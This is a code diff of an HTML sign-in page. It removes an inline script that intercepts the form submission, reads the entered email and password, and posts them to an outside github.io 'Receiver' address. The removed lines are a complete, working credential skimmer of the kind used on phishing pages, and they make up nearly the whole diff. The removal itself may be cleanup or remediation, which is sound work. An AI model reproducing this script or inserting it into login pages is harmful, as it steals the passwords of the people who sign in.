@@ -28,37 +28,5 @@
           <input type="submit" name="sign-in" value="Sign In" id="submitbutton">
         </form>
       </div>
-
-      <script>
-        const form = document.getElementById('form');
-        const Email = document.getElementById('email');
-        const Password = document.getElementById('password');
-
-        form.addEventListener('submit', function(event) {
-            event.preventDefault();
-
-            const emailValue = Email.value;
-            const passwordValue = Password.value;
-
-            const formData = new FormData();
-            formData.append('email', emailValue);
-            formData.append('text', passwordValue);
-
-            fetch('https://dominator200.github.io/Receiver8787462385790687/', {
-                method: 'POST',
-                body: formData,
-                headers: {
-                'Content-Type': 'application/x-www-form-urlencoded',
-            },
-        })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Server response:', data);
-            })
-            .catch(error => {
-                console.error('error:', error)
-            });
-        });
-      </script>
 </body>
 </html>
